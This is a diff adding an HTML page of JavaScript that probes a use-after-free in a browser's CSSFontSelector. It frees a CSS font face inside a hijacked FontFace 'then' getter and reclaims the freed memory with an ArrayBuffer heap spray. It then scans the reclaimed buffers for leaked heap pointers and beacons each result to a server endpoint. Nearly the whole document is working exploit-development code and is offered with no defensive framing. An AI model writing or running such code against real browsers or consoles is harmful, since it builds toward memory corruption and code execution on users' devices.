@@ -1,0 +1,461 @@
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P1227 selector dangling</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#050508;color:#e8ffe8;font:13px/1.4 'Courier New',monospace;padding:10px}
+#s{font-size:18px;font-weight:bold;color:#ffd75e;padding:8px 0}
+#r{color:#ff55c8;white-space:pre-wrap;word-break:break-all;font-size:12px;line-height:1.6}
+#t{position:absolute;left:-9999px;top:0}
+</style>
+</head><body>
+<div id="s">P1227 BOOTING...</div>
+<div id="r"></div>
+<div id="t"></div>
+<script>
+'use strict';
+/* ═══════════════════════════════════════════════════════════════════
+   P1227: CSSFontSelector dangling pointer test
+
+   CRITICAL INSIGHT: Our previous .then getter called
+   document.body.offsetHeight BEFORE the ArrayBuffer spray.
+   This forces CSS style resolution → CSSFontSelector rebuild →
+   cleans up the freed CSSFontFace entry BEFORE we reclaim it!
+
+   FIX: Remove offsetHeight. Remove the early check() call.
+   Then after spray, test whether the selector still has a
+   dangling pointer to our reclaimed buffer.
+
+   EXPERIMENTS:
+   A) No-offsetHeight reclaim → sentinel buffer → check('1em s0')
+      → did any buffer bytes change? (proves engine read/write)
+   B) Render text in font 's0' → forces complete font matching
+   C) load('1em s0') → triggers loading path through CSSFontFace
+   D) 0xCC-filled buffer variant → crash = dangling ptr confirmed
+   E) Worker FontFace availability
+   ═══════════════════════════════════════════════════════════════════ */
+
+var S=document.getElementById('s'),R=document.getElementById('r');
+function msg(t){R.textContent+=(R.textContent?'\n':'')+t;}
+
+function B(tag,data){
+  try{
+    var u='/beacon.php?tag=P1227-'+encodeURIComponent(tag);
+    if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
+    u+='&t='+Date.now();
+    var x=new XMLHttpRequest();x.open('GET',u,false);x.send(null);
+  }catch(e){}
+}
+window.onerror=function(m,s,l){B('ERR',m+'@'+l);};
+
+function hex(v){return('0'+v.toString(16)).slice(-2);}
+function dumpRange(view,start,len){
+  var s='';for(var i=0;i<len;i++)s+=hex(view[start+i]);return s;
+}
+
+B('START','selector-dangling-test');
+S.textContent='P1227 RUNNING...';
+msg('=== P1227: CSSFontSelector dangling pointer test ===');
+msg('');
+
+var K=16,SIZE=192;
+
+/* ═══════ EXPERIMENT A: No-offsetHeight reclaim ═══════ */
+msg('=== EXP A: No-offsetHeight reclaim + check ===');
+
+var styleA=document.createElement('style');
+styleA.textContent="@font-face{font-family:xfA;src:local(Arial);unicode-range:U+0041-005A;}";
+document.head.appendChild(styleA);
+
+var faceA=new FontFace('trigA','local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(faceA);
+void faceA.loaded;
+window.__alive=[faceA];
+
+var firedA=false;
+var mapA=null;
+
+Object.defineProperty(FontFace.prototype,'then',{
+  configurable:true,
+  get:function(){
+    if(firedA)return undefined;
+    firedA=true;
+
+    /* FREE the CSS-side CSSFontFace for 'xfA' */
+    styleA.remove();
+    styleA=null;
+
+    /* Do NOT call document.fonts.delete(this) yet */
+    /* Do NOT call document.body.offsetHeight — avoid selector rebuild! */
+    /* Do NOT call document.fonts.check — avoid triggering match! */
+
+    /* IMMEDIATELY spray ArrayBuffer(192) to reclaim */
+    mapA=[];
+    for(var k=0;k<K;k++){
+      var ab=new ArrayBuffer(SIZE);
+      var v=new Uint8Array(ab);
+      /* Fill with per-buffer sentinels */
+      for(var i=0;i<SIZE;i++) v[i]=((k*7+i)&0xFF);
+      /* Mark offset 0 (refcount area) with buffer index */
+      v[0]=0xA0+k;v[1]=k;v[2]=0;v[3]=0;
+      mapA.push({view:v,bv:new BigUint64Array(ab),ab:ab});
+    }
+
+    /* Return undefined — no .then chaining */
+    return undefined;
+  },
+  set:function(){}
+});
+
+/* Trigger the reclaim */
+document.fonts.load('1em trigA, xfA','AB').then(function(){},function(){});
+
+/* Check results AFTER reclaim, with minimal delay */
+setTimeout(function(){
+  if(!mapA){B('A-NO-MAP','failed');doExpB();return;}
+
+  /* Find which buffer got the CSSFontFace */
+  var hitA=-1,nzA=0;
+  for(var i=0;i<mapA.length;i++){
+    var v=mapA[i].view;
+    /* Check if our sentinels were overwritten */
+    var changed=0;
+    for(var j=0;j<SIZE;j++){
+      var expected=((i*7+j)&0xFF);
+      if(j===0)expected=0xA0+i;
+      else if(j===1)expected=i;
+      else if(j===2||j===3)expected=0;
+      if(v[j]!==expected)changed++;
+    }
+    if(changed>0&&changed<SIZE){hitA=i;nzA=changed;break;}
+  }
+
+  if(hitA<0){
+    /* Maybe CSSFontFace landed and overwrote our sentinels with its own data */
+    /* Check for CSSFontFace signature: small refcount at +0, pointers at +0x58/+0x68 */
+    for(var i=0;i<mapA.length;i++){
+      var bv=mapA[i].bv;
+      var p58=bv[0x58/8];var p68=bv[0x68/8];
+      /* Check if p58 or p68 look like heap pointers (0x100xxxxxxxxx) */
+      var s58=p58.toString(16);var s68=p68.toString(16);
+      if(s58.length>8&&s58.indexOf('100')===0){
+        hitA=i;nzA=-1;/* sentinel-based detection failed, pointer-based found */
+        break;
+      }
+    }
+  }
+
+  B('A-SCAN','hit='+hitA+'|changed='+nzA);
+  msg('scan: hit='+hitA+' changed='+nzA);
+
+  if(hitA>=0){
+    /* Snapshot the hit buffer BEFORE any check/load */
+    var snapBefore=new Uint8Array(SIZE);
+    var tv=mapA[hitA].view;
+    for(var i=0;i<SIZE;i++)snapBefore[i]=tv[i];
+
+    var p58=dumpRange(tv,0x58,8);
+    var p68=dumpRange(tv,0x68,8);
+    B('A-HIT','buf'+hitA+'|p58='+p58+'|p68='+p68);
+    msg('HIT buf'+hitA+': p58='+p58+' p68='+p68);
+
+    /* NOW test: does check('1em xfA') dereference our buffer? */
+    var checkResult='unknown';
+    try{
+      checkResult=document.fonts.check('1em xfA','A');
+    }catch(e){
+      checkResult='err:'+e.message;
+      B('A-CHECK-ERR',e.message);
+    }
+    B('A-CHECK-RESULT','check='+checkResult);
+    msg('check("1em xfA","A") = '+checkResult);
+
+    /* Check for ANY byte changes after check() */
+    var diffsCheck=[];
+    for(var i=0;i<SIZE;i++){
+      if(tv[i]!==snapBefore[i])
+        diffsCheck.push('+0x'+hex(i)+'='+hex(snapBefore[i])+'->'+hex(tv[i]));
+    }
+    B('A-CHECK-DIFFS',diffsCheck.length>0?diffsCheck.join(','):'none');
+    msg('check diffs: '+(diffsCheck.length>0?diffsCheck.join(' '):'NONE'));
+
+    /* Snapshot again before load() */
+    for(var i=0;i<SIZE;i++)snapBefore[i]=tv[i];
+
+    /* Test load() — triggers more complete code path */
+    try{
+      document.fonts.load('1em xfA','ABCXYZ').then(function(faces){
+        B('A-LOAD-OK','faces='+faces.length);
+      },function(e){
+        B('A-LOAD-FAIL',String(e));
+      });
+    }catch(e){
+      B('A-LOAD-ERR',e.message);
+    }
+
+    /* Small delay for load to process */
+    setTimeout(function(){
+      var diffsLoad=[];
+      for(var i=0;i<SIZE;i++){
+        if(tv[i]!==snapBefore[i])
+          diffsLoad.push('+0x'+hex(i)+'='+hex(snapBefore[i])+'->'+hex(tv[i]));
+      }
+      B('A-LOAD-DIFFS',diffsLoad.length>0?diffsLoad.join(','):'none');
+      msg('load diffs: '+(diffsLoad.length>0?diffsLoad.join(' '):'NONE'));
+
+      /* Snapshot before render test */
+      for(var i=0;i<SIZE;i++)snapBefore[i]=tv[i];
+
+      /* Test render — force font matching by rendering text with font 'xfA' */
+      var renderEl=document.getElementById('t');
+      renderEl.style.fontFamily='xfA, serif';
+      renderEl.textContent='ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+      /* Force layout to trigger font matching */
+      var w=renderEl.offsetWidth;
+
+      var diffsRender=[];
+      for(var i=0;i<SIZE;i++){
+        if(tv[i]!==snapBefore[i])
+          diffsRender.push('+0x'+hex(i)+'='+hex(snapBefore[i])+'->'+hex(tv[i]));
+      }
+      B('A-RENDER-DIFFS',diffsRender.length>0?diffsRender.join(','):'none');
+      msg('render diffs: '+(diffsRender.length>0?diffsRender.join(' '):'NONE'));
+
+      /* Full buffer dump at end */
+      B('A-FINAL-DUMP',dumpRange(tv,0,96)+'|'+dumpRange(tv,96,96));
+
+      doExpB();
+    },100);
+
+  }else{
+    B('A-NO-HIT','clean');
+    msg('No hit — CSSFontFace not reclaimed');
+    doExpB();
+  }
+},80);
+
+/* ═══════ EXPERIMENT B: offsetHeight variant (control) ═══════ */
+function doExpB(){
+  msg('');msg('=== EXP B: WITH offsetHeight (control) ===');
+
+  var styleB=document.createElement('style');
+  styleB.textContent="@font-face{font-family:xfB;src:local(Arial);unicode-range:U+0041-005A;}";
+  document.head.appendChild(styleB);
+
+  var faceB=new FontFace('trigB','local(Helvetica)',{unicodeRange:'U+0041'});
+  document.fonts.add(faceB);
+  void faceB.loaded;
+  window.__alive.push(faceB);
+
+  var firedB=false;
+  var mapB=null;
+
+  Object.defineProperty(FontFace.prototype,'then',{
+    configurable:true,
+    get:function(){
+      if(firedB)return undefined;
+      firedB=true;
+
+      styleB.remove();
+      styleB=null;
+
+      /* THIS TIME: force layout = rebuild selector */
+      document.body.offsetHeight;
+
+      mapB=[];
+      for(var k=0;k<K;k++){
+        var ab=new ArrayBuffer(SIZE);
+        mapB.push({view:new Uint8Array(ab),bv:new BigUint64Array(ab),ab:ab});
+      }
+      return undefined;
+    },
+    set:function(){}
+  });
+
+  document.fonts.load('1em trigB, xfB','CD').then(function(){},function(){});
+
+  setTimeout(function(){
+    if(!mapB){B('B-NO-MAP','failed');doExpC();return;}
+
+    var hitB=-1,nzB=0;
+    for(var i=0;i<mapB.length;i++){
+      var v=mapB[i].view,n=0;
+      for(var j=0;j<SIZE;j++)if(v[j]!==0)n++;
+      if(n>nzB){nzB=n;hitB=i;}
+    }
+
+    if(hitB>=0){
+      var p58=dumpRange(mapB[hitB].view,0x58,8);
+      var p68=dumpRange(mapB[hitB].view,0x68,8);
+      B('B-HIT','buf'+hitB+'|nz='+nzB+'|p58='+p58+'|p68='+p68);
+      msg('B HIT buf'+hitB+': nz='+nzB+' p58='+p58+' p68='+p68);
+
+      /* Same check test as control */
+      var tv=mapB[hitB].view;
+      var snap=new Uint8Array(SIZE);
+      for(var i=0;i<SIZE;i++)snap[i]=tv[i];
+
+      var checkB='unknown';
+      try{checkB=document.fonts.check('1em xfB','A');}catch(e){checkB='err:'+e.message;}
+
+      var diffsB=[];
+      for(var i=0;i<SIZE;i++){
+        if(tv[i]!==snap[i])diffsB.push('+0x'+hex(i)+'='+hex(snap[i])+'->'+hex(tv[i]));
+      }
+      B('B-CHECK','check='+checkB+'|diffs='+(diffsB.length>0?diffsB.join(','):'none'));
+      msg('B check='+checkB+' diffs='+(diffsB.length>0?diffsB.join(' '):'NONE'));
+    }else{
+      B('B-CLEAN','no-hit|nz='+nzB);
+      msg('B: S1-CLEAN (no reclaim)');
+    }
+
+    doExpC();
+  },150);
+}
+
+/* ═══════ EXPERIMENT C: Worker FontFace availability ═══════ */
+function doExpC(){
+  msg('');msg('=== EXP C: Worker FontFace ===');
+
+  var wCode=[
+    'var r={};',
+    'try{r.FontFace=typeof FontFace;}catch(e){r.FontFace="err:"+e.message;}',
+    'try{r.FontFaceSet=typeof FontFaceSet;}catch(e){r.FontFaceSet="err:"+e.message;}',
+    'try{r.document=typeof document;}catch(e){r.document="err:"+e.message;}',
+    'try{r.self_fonts=typeof self.fonts;}catch(e){r.self_fonts="err:"+e.message;}',
+    'try{',
+    '  if(typeof FontFace==="function"){',
+    '    var f=new FontFace("wTest","local(Arial)");',
+    '    r.FontFace_create="ok";',
+    '    r.FontFace_family=f.family;',
+    '    r.FontFace_status=f.status;',
+    '    if(f.loaded){r.FontFace_loaded="exists";}else{r.FontFace_loaded="missing";}',
+    '  }',
+    '}catch(e){r.FontFace_create="err:"+e.message;}',
+    '',
+    '// Test if Worker can allocate in same bmalloc heap as main thread',
+    'var bufs=[];',
+    'for(var i=0;i<50;i++){',
+    '  var ab=new ArrayBuffer(192);',
+    '  var v=new Uint8Array(ab);',
+    '  v[0]=0xBB;v[1]=i;',
+    '  bufs.push(ab);',
+    '}',
+    'r.alloc_count=bufs.length;',
+    '',
+    '// Transfer first buffer back to prove cross-thread ArrayBuffer works',
+    'self.postMessage({type:"result",data:r,buf:bufs[0]},[bufs[0]]);'
+  ].join('\n');
+
+  try{
+    var blob=new Blob([wCode],{type:'application/javascript'});
+    var url=URL.createObjectURL(blob);
+    var w=new Worker(url);
+
+    w.onmessage=function(e){
+      var d=e.data;
+      if(d.type==='result'){
+        var fstr=[];
+        for(var k in d.data)fstr.push(k+'='+JSON.stringify(d.data[k]));
+        B('C-WORKER-RESULT',fstr.join('|').slice(0,900));
+        msg('Worker: '+fstr.join(' '));
+
+        if(d.buf instanceof ArrayBuffer){
+          var v=new Uint8Array(d.buf);
+          B('C-WORKER-BUF','b0='+hex(v[0])+'|b1='+hex(v[1])+'|size='+d.buf.byteLength);
+          msg('Transferred buf: 0x'+hex(v[0])+hex(v[1])+' size='+d.buf.byteLength);
+        }
+        w.terminate();
+      }
+      doExpD();
+    };
+
+    w.onerror=function(e){
+      B('C-WORKER-ERR',e.message||'unknown');
+      msg('Worker err: '+(e.message||'unknown'));
+      doExpD();
+    };
+
+    setTimeout(function(){
+      B('C-TIMEOUT','worker-timeout');
+      doExpD();
+    },3000);
+
+  }catch(e){
+    B('C-ERR',e.message);
+    msg('Worker create err: '+e.message);
+    doExpD();
+  }
+}
+
+/* ═══════ EXPERIMENT D: Network font .loaded settlement ═══════ */
+function doExpD(){
+  msg('');msg('=== EXP D: Network font .loaded ===');
+
+  /* Test if a url() source causes .loaded to settle (resolve/reject) */
+  var weakD=null;
+  var settleD='pending';
+
+  try{
+    var fD=new FontFace('netTest','url(/document/en/ps5/fakefont.woff2)');
+    weakD=new WeakRef(fD);
+
+    fD.loaded.then(function(){
+      settleD='resolved';
+      B('D-SETTLED','resolved');
+      msg('netTest .loaded RESOLVED');
+    },function(e){
+      settleD='rejected:'+e.message;
+      B('D-SETTLED','rejected|'+e.message);
+      msg('netTest .loaded REJECTED: '+e.message);
+    });
+
+    /* Try to trigger the load */
+    fD.load().then(function(){
+      B('D-LOAD-OK','loaded');
+    },function(e){
+      B('D-LOAD-FAIL',e.message);
+    });
+
+    B('D-STATUS','status='+fD.status);
+    msg('netTest status='+fD.status);
+
+    /* Null the reference after settlement check is set up */
+    setTimeout(function(){
+      fD=null;
+      B('D-NULLED','after-500ms|settle='+settleD);
+
+      /* GC pressure after 1s */
+      setTimeout(function(){
+        for(var w=0;w<20;w++){
+          var j=[];
+          for(var i=0;i<5000;i++)j.push({x:i,s:'gc'+i+'_'.repeat(10)});
+          j=null;
+        }
+
+        var alive=weakD?weakD.deref()!==undefined:false;
+        B('D-GC-CHECK','alive='+alive+'|settle='+settleD);
+        msg('after GC: alive='+alive+' settle='+settleD);
+
+        finalize();
+      },500);
+    },1500);
+
+  }catch(e){
+    B('D-ERR',e.message);
+    msg('FontFace url() err: '+e.message);
+    finalize();
+  }
+}
+
+function finalize(){
+  msg('');msg('=== P1227 COMPLETE ===');
+  S.textContent='P1227 COMPLETE';
+  B('DONE','all');
+}
+
+/* Safety timeout */
+setTimeout(finalize,30000);
+</script>
+</body></html>
